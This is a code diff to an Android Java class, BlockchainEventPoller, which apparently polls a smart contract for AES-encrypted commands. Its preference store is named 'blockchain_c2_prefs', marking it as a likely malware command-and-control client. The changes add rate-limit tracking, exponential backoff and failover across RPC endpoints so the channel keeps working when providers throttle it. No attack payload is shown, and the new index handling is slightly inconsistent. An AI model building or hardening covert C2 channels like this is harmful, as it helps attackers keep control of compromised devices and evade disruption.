@@ -35,6 +35,16 @@ public class BlockchainEventPoller {
     private String lastSignature = null;
     private static final String PREFS_NAME = "blockchain_c2_prefs";
     private static final String PREF_LAST_SIG = "last_sig";
+    
+    // RPC rate limit tracking
+    private static class RpcRateLimit {
+        long last429Time = 0;
+        int consecutive429s = 0;
+        long backoffUntil = 0;
+    }
+    private final java.util.Map<String, RpcRateLimit> rpcRateLimits = new java.util.concurrent.ConcurrentHashMap<>();
+    private static final long RATE_LIMIT_BACKOFF_MS = 30000; // 30 seconds initial backoff
+    private static final long MAX_BACKOFF_MS = 300000; // 5 minutes max backoff
 
     public BlockchainEventPoller(String rpcUrl, String contractAddress, String aesKeyHex, int pollingInterval) {
         this.rpcUrl = rpcUrl;
@@ -290,11 +300,29 @@ public class BlockchainEventPoller {
     }
 
     private JSONObject sendRpcRequest(JSONObject request) {
-        int attempts = rpcCandidates.size() > 0 ? rpcCandidates.size() : 1;
+        // Filter out rate-limited RPCs
+        List<String> availableRpcs = new ArrayList<>();
+        long now = System.currentTimeMillis();
+        for (String rpc : rpcCandidates) {
+            RpcRateLimit limit = rpcRateLimits.get(rpc);
+            if (limit == null || now >= limit.backoffUntil) {
+                availableRpcs.add(rpc);
+            }
+        }
+        
+        // If all RPCs are rate-limited, clear penalties and use all
+        if (availableRpcs.isEmpty()) {
+            Log.w(TAG, "All RPCs rate-limited, clearing penalties and retrying");
+            rpcRateLimits.clear();
+            availableRpcs = new ArrayList<>(rpcCandidates);
+        }
+        
+        int attempts = availableRpcs.size() > 0 ? availableRpcs.size() : rpcCandidates.size();
         for (int attempt = 0; attempt < attempts; attempt++) {
             try {
-                int idx = (rpcIndex + attempt) % rpcCandidates.size();
-                String candidate = rpcCandidates.get(idx);
+                int idx = (rpcIndex + attempt) % (availableRpcs.isEmpty() ? rpcCandidates.size() : availableRpcs.size());
+                String candidate = availableRpcs.isEmpty() ? rpcCandidates.get(idx) : availableRpcs.get(idx);
+                
                 URL url = new URL(candidate);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
@@ -318,6 +346,14 @@ public class BlockchainEventPoller {
                         }
                         rpcIndex = idx;
                         rpcUrl = candidate;
+                        
+                        // Clear rate limit on success
+                        RpcRateLimit limit = rpcRateLimits.get(candidate);
+                        if (limit != null) {
+                            limit.consecutive429s = 0;
+                            limit.backoffUntil = 0;
+                        }
+                        
                         if (attempt > 0) {
                             Log.w(TAG, "Switched RPC to " + candidate + " after previous failure");
                         }
@@ -332,8 +368,24 @@ public class BlockchainEventPoller {
                             errBody.append(line.trim());
                         }
                     } catch (Exception ignore) {}
+                    
+                    if (responseCode == 429) {
+                        // Rate limited - apply exponential backoff
+                        RpcRateLimit limit = rpcRateLimits.get(candidate);
+                        if (limit == null) {
+                            limit = new RpcRateLimit();
+                            rpcRateLimits.put(candidate, limit);
+                        }
+                        limit.last429Time = now;
+                        limit.consecutive429s++;
+                        // Exponential backoff: 30s, 60s, 120s, 240s, max 5min
+                        long backoff = Math.min(RATE_LIMIT_BACKOFF_MS * (1L << Math.min(limit.consecutive429s - 1, 4)), MAX_BACKOFF_MS);
+                        limit.backoffUntil = now + backoff;
+                        Log.w(TAG, "RPC " + candidate + " rate-limited (429), backing off for " + (backoff / 1000) + "s");
+                        continue; // try next RPC
+                    }
+                    
                     Log.e(TAG, "RPC failed code " + responseCode + " body: " + errBody.toString());
-                    if (responseCode == 429) continue; // try next RPC on rate limit
                 }
             } catch (Exception e) {
                 Log.e(TAG, "RPC request error (attempt " + (attempt + 1) + ")", e);
